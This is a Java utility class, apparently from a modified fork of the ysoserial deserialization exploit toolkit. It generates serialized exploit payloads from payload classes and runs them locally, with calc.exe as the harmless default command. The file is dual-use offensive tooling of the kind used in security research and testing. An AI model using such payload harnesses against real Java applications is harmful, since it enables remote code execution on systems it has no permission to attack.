package ysoserial.payloads.util;

import ysoserial.Deserializer;
import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.secmgr.ExecCheckingSecurityManager;

import java.util.HashMap;
import java.util.concurrent.Callable;


/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {

    public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
        // ensure payload generation doesn't throw an exception
        byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>() {
            public byte[] call() throws Exception {
                final String objtype = args.length > 0 && args[0] != null ? args[0] : getDefaultTestCmd();
                HashMap<String, String> vars = new HashMap<String, String>();
                vars.put("platform", args[1]);
                vars.put("vector", args[2]);
                System.out.println("generating payload object(s) for platform: '" + objtype + "'");

                ObjectPayload<?> payload = clazz.newInstance();
                final Object objBefore = payload.getObject(vars);

                System.out.println("serializing payload");
                byte[] ser = Serializer.serialize(objBefore);
//                FileUtils.writeByteArrayToFile(new File("../external/apereocas.payload"), ser);
                Utils.releasePayload(payload, objBefore);
                return ser;
            }
        });

        try {
            System.out.println("deserializing payload");
            final Object objAfter = Deserializer.deserialize(serialized);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static String getDefaultTestCmd() {
        return getFirstExistingFile(
            "C:\\Windows\\System32\\calc.exe",
            "/Applications/Calculator.app/Contents/MacOS/Calculator",
            "/usr/bin/gnome-calculator",
            "/usr/bin/kcalc"
        );
    }

    private static String getFirstExistingFile(String... files) {
        return "calc.exe";
//        for (String path : files) {
//            if (new File(path).exists()) {
//                return path;
//            }
//        }
//        throw new UnsupportedOperationException("no known test executable");
    }
}
